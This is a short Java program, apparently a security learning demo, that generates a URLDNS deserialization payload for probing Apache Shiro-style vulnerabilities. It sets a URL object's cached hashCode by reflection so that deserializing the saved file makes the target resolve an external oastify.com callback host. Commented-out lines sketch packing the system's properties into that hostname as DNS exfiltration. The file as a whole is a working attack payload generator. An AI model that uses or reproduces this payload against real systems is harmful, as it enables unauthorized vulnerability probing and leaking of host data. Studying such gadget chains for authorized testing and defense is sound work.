package demo.shiro;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.Properties;

public class DNSTest {
    public static void main(String[] args) throws Exception{
        HashMap<URL, String> map = new HashMap<URL, String>();
//        String osname = String.valueOf(System.getProperties());
//        osname = osname.replace(" ","-");
        URL url = new URL("http://lg581jortmzbw9e0t4gvhq30qrwokd.oastify.com");
        Class clazz = Class.forName("java.net.URL");
        Field hashCode = clazz.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,123);
        map.put(url,"test");
        hashCode.set(url,-1);
        serialize(map);
        //unserialize(shiro.ser)
    }

    //序列化
    public static void serialize(Object obj) throws Exception{
        FileOutputStream fos = new FileOutputStream("./data/shirodns.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws Exception{
        FileInputStream fis = new FileInputStream(filename);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object object = ois.readObject();
        return object;
    }

}
